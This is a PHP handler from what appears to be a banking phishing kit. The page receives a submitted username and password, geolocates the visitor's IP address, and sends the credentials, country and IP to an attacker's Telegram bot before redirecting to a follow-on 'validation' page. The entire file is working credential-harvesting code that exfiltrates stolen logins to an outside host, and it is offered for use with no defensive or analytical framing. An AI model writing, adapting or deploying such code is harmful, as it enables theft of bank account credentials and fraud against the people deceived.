<?php
session_start();
require_once("settings.php");
$website = "https://api.telegram.org/bot$token";

if (isset($_POST["usuario"]) && isset($_POST["cpass"])) {
    $usuario = $_POST["usuario"];
    $cpass = $_POST["cpass"];
    $_SESSION["usuario"] = $usuario; // ← Guardamos el usuario para el resto del flujo

    $ip = $_SERVER["REMOTE_ADDR"];
    $ch = curl_init("http://ip-api.com/json/$ip");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $ip_data = json_decode(curl_exec($ch), true);
    curl_close($ch);

    $country = $ip_data["country"] ?? "Desconocido";
    $ip = $ip_data["query"] ?? $ip;

    $msg = "BCRs 📲\n📧 Usuario: $usuario\n🔑 Clave: $cpass\n=============================\n📍 País: $country\n📍 IP: $ip\n==========================\n";
    $url = "$website/sendMessage?chat_id=$chat_id&parse_mode=HTML&text=" . urlencode($msg);
    file_get_contents($url);

    // Redirección
    header("Location: procesar_validacion.php");
    exit;
}
?>
